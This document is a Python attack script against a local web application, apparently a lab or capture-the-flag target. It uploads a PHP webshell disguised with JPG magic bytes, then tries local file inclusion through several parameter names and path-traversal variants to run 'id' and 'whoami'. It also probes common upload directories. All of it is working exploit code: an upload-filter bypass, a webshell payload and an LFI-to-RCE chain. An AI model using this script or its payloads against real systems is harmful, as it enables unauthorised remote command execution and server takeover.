import requests
import os
import base64
from io import BytesIO

base_url = "http://127.0.0.1:32824"

# Create a JPG-compatible PHP webshell
def create_jpg_webshell():
    # JPG magic bytes + PHP shell
    shell_content = b'''\xff\xd8\xff\xfe<?php system($_GET['cmd']); ?>
'''
    return shell_content

print("Testing JPG file upload with embedded PHP shell...")
print("=" * 60)

# Try uploading a JPG with embedded PHP
shell_data = create_jpg_webshell()

files = {'userfile': ('shell.jpg', BytesIO(shell_data), 'image/jpeg')}
data = {'submit': 'Upload Image'}
response = requests.post(f"{base_url}/index.php", files=files, data=data)
print(f"Upload status: {response.status_code}")
print(f"Response: {response.text[:700]}")

# Try accessing the uploaded JPG via LFI
lfi_tests = [
    f"{base_url}/index.php?file=upload/shell.jpg&cmd=id",
    f"{base_url}/index.php?include=upload/shell.jpg&cmd=id",
    f"{base_url}/index.php?page=upload/shell.jpg&cmd=id"
]

print("\n1. Testing LFI with JPG shell...")
for url in lfi_tests:
    resp = requests.get(url)
    if resp.status_code == 200 and 'uid=' in resp.text:
        print(f"[!] COMMAND EXECUTION WORKS at: {url}")
        print(f"Output: {resp.text}")
    elif 'Invalid Image' not in resp.text:
        print(f"[Response] {url}: {len(resp.content)} bytes")
        if len(resp.content) < 500:
            print(f"  Content: {resp.text}")

# Try more LFI payload techniques
print("\n2. Testing other parameter names for LFI...")
param_names = ['file', 'include', 'page', 'path', 'lang', 'template', 'view']
for param in param_names:
    url = f"{base_url}/index.php?{param}=shell.jpg&cmd=id"
    resp = requests.get(url)
    if resp.status_code == 200 and 'uid=' in resp.text:
        print(f"[!] RCE via {param} parameter")

# Try path traversal to bypass upload restrictions
print("\n3. Testing path traversal...")
traversal_payloads = [
    "upload/shell.jpg",
    "./upload/shell.jpg",
    "../upload/shell.jpg",
    "../../upload/shell.jpg"
]

for payload in traversal_payloads:
    url = f"{base_url}/index.php?file={payload}&cmd=whoami"
    resp = requests.get(url)
    print(f"  Testing: {payload}")
    if resp.status_code == 200 and len(resp.text) < 2000:
        print(f"    Response: {resp.text[:500]}")

# Check for directory structures
print("\n4. Testing common application paths...")
test_paths = ['/upload', '/uploads', '/images', '/files', '/gallery', '/img']
for path in test_paths:
    resp = requests.get(f"{base_url}{path}/")
    print(f"  {path}/: {resp.status_code}")

print("\n" + "=" * 60)
print("JPG shell testing complete.")
